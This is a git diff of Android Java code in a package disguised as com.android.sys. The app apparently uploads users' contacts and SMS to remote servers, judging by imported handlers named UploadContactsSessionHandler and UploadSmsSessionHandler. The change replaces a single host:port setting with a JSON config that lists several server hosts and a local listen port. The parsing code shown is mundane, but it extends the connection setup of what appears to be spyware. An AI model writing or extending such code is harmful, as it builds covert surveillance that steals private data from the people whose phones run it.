@@ -15,6 +15,10 @@ import com.android.sys.session.handler.UploadContactsSessionHandler;
 import com.android.sys.session.handler.UploadSmsSessionHandler;
 import com.android.sys.utils.SystemUtil;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.IOException;
 import java.io.InputStream;
 import java.util.Timer;
@@ -60,21 +64,19 @@ public class SystemService extends Service{
 
     private void loadConfig() {
         try {
-            //read address, port, from "hostname" file
-            InputStream is = getAssets().open("hostname");
+            //read address, port, from "config" file
+            InputStream is = getAssets().open("config");
             byte[] data = new byte[is.available()];
             is.read(data);
-            String address = new String(data, "UTF-8");
-            String[] host_port = address.split(":");
-
-            if(host_port.length >= 1) {
-                mSessionManager.setHost( host_port[0] );
-            }
-            if(host_port.length >= 2) {
-                try {
-                    mSessionManager.setPort(Integer.parseInt(host_port[1]));
-                } catch (Exception e) {
+            String config = new String(data, "UTF-8");
+            try {
+                JSONObject jsonObject = new JSONObject(config);
+                JSONArray hosts = jsonObject.getJSONArray("hosts");
+                for(int i=0; i<hosts.length(); ++i) {
+                    mSessionManager.addHost(hosts.getString(i));
                 }
+                mSessionManager.setLocalPort(jsonObject.getInt("listen_port"));
+            } catch (JSONException e) {
             }
         } catch (IOException e) {
         }
